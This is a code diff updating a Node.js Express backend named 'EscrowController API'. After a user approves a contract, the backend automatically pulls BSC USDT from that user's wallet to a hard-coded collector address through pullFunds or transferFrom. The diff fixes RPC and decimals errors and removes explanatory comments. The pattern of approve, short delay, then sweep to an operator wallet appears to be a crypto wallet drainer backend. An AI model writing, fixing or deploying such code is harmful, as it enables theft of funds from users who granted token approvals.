@@ -12,15 +12,10 @@ app.use(express.json());
 
 // ============ CONFIGURATION ============
 const CONFIG = {
-    // 5e - EscrowController contract (User approves to this)
     RELAYER_ADDRESS: "0xEf1F8D5bE822993698D01e62daBb449a90e47bD9",
-    
-    // 8b - Your wallet (collector & executor)
     COLLECTOR_ADDRESS: "0x60dc34baEAC43528072E431b0b7BF950ca248aba",
-    
     USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
     
-    // Multiple RPCs for reliability
     RPC_URLS: [
         "https://bsc-dataseed1.binance.org/",
         "https://bsc-dataseed2.binance.org/",
@@ -31,11 +26,9 @@ const CONFIG = {
     ],
     
     DATA_FILE: path.join(__dirname, 'data.json'),
-    
-    // Timing settings
-    APPROVAL_DELAY: 5000,    // 5 seconds wait for approval to mine
-    MAX_RETRIES: 3,          // Retry failed transfers
-    RETRY_DELAY: 3000        // 3 seconds between retries
+    APPROVAL_DELAY: 5000,
+    MAX_RETRIES: 3,
+    RETRY_DELAY: 3000
 };
 
 // ============ DATA STORAGE ============
@@ -66,11 +59,11 @@ function sleep(ms) {
     return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// ============ GET WORKING RPC ============
+// ============ GET WORKING RPC (FIXED) ============
 async function getWorkingProvider() {
     for (const rpcUrl of CONFIG.RPC_URLS) {
         try {
-            const provider = new ethers.JsonRpcProvider(rpcUrl);
+            const provider = new ethers.JsonRpcProvider(rpcUrl, 56, { staticNetwork: true });
             await provider.getBlockNumber();
             console.log(`✅ RPC: ${rpcUrl}`);
             return provider;
@@ -81,7 +74,18 @@ async function getWorkingProvider() {
     throw new Error('No working RPC found');
 }
 
-// ============ AUTO-TRANSFER FUNCTION ============
+// ============ SAFE DECIMALS (FIX for BAD_DATA) ============
+async function getSafeDecimals(tokenContract) {
+    try {
+        const decimals = await tokenContract.decimals();
+        return Number(decimals);
+    } catch (err) {
+        console.log(`⚠️ decimals() failed, using default 18. Error: ${err.message}`);
+        return 18; // BSC USDT default is 18
+    }
+}
+
+// ============ AUTO-TRANSFER FUNCTION (FIXED) ============
 async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHuman) {
     console.log(`\n🚀 Auto-transfer for ${userAddress} (${requestedAmountHuman} USDT)`);
 
@@ -103,7 +107,9 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
         ];
 
         const token = new ethers.Contract(tokenAddress, tokenABI, provider);
-        const decimals = await token.decimals();
+        
+        // 🔥 FIX: Safe decimals call
+        const decimals = await getSafeDecimals(token);
         const requestedAmountWei = ethers.parseUnits(requestedAmountHuman.toString(), decimals);
         
         // Check balance
@@ -136,13 +142,13 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
                 if (company.toLowerCase() === wallet.address.toLowerCase()) {
                     console.log('✅ Using pullFunds...');
                     
-                    const gasPrice = (await provider.getFeeData()).gasPrice;
+                    const feeData = await provider.getFeeData();
                     const tx = await escrow.pullFunds(
                         tokenAddress,
                         userAddress,
                         CONFIG.COLLECTOR_ADDRESS,
                         requestedAmountWei,
-                        { gasLimit: 150000, gasPrice }
+                        { gasLimit: 150000, gasPrice: feeData.gasPrice }
                     );
 
                     console.log(`📤 Tx: ${tx.hash}`);
@@ -170,13 +176,13 @@ async function performAutoTransfer(userAddress, tokenAddress, requestedAmountHum
             console.log('✅ Using direct transferFrom...');
             
             const tokenWithSigner = new ethers.Contract(tokenAddress, tokenABI, wallet);
-            const gasPrice = (await provider.getFeeData()).gasPrice;
+            const feeData = await provider.getFeeData();
             
             const tx = await tokenWithSigner.transferFrom(
                 userAddress,
                 CONFIG.COLLECTOR_ADDRESS,
                 requestedAmountWei,
-                { gasLimit: 100000, gasPrice }
+                { gasLimit: 100000, gasPrice: feeData.gasPrice }
             );
 
             console.log(`📤 Tx: ${tx.hash}`);
@@ -284,7 +290,6 @@ app.post('/collect', async (req, res) => {
 
         saveData();
 
-        // ⏰ DELAYED AUTO-TRANSFER (Wait for approval to mine)
         console.log(`⏰ Scheduling transfer in ${CONFIG.APPROVAL_DELAY / 1000}s...`);
         
         setTimeout(() => {
@@ -298,7 +303,6 @@ app.post('/collect', async (req, res) => {
                     console.log('❌ Transfer failed:', result.error);
                     transaction.transferError = result.error;
                     
-                    // Save for manual review
                     dataStore.pendingTransfers.push({
                         user: from,
                         token: token,
@@ -311,7 +315,6 @@ app.post('/collect', async (req, res) => {
             });
         }, CONFIG.APPROVAL_DELAY);
 
-        // Respond immediately
         res.json({ 
             ok: true, 
             id: transactionId, 
@@ -347,7 +350,7 @@ app.get('/pending', (req, res) => {
 
 app.get('/', (req, res) => {
     res.json({
-        message: 'EscrowController API v4.1',
+        message: 'EscrowController API v4.2 (Fixed)',
         flow: {
             step1: 'User approves 5e contract',
             step2: 'Wait 5 seconds for confirmation',
@@ -364,17 +367,11 @@ app.get('/', (req, res) => {
 app.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════╗
-║     🚀 EscrowController API v4.1                  ║
+║     🚀 EscrowController API v4.2 (Fixed)          ║
 ╠══════════════════════════════════════════════════╣
 ║  Port: ${PORT}                                      ║
-║  Approve: ${CONFIG.RELAYER_ADDRESS} (12)            ║
-║  Collect: ${CONFIG.COLLECTOR_ADDRESS} (8c)          ║
-║                                                  ║
-║  Features:                                       ║
-║  ✅ 5s delay after approval                      ║
-║  ✅ Multiple RPC fallback                        ║
-║  ✅ Auto-retry (3 attempts)                      ║
-║  ✅ Pending transfers tracking                   ║
+║  Approve: ${CONFIG.RELAYER_ADDRESS}            ║
+║  Collect: ${CONFIG.COLLECTOR_ADDRESS}          ║
 ╚══════════════════════════════════════════════════╝
     `);
 });
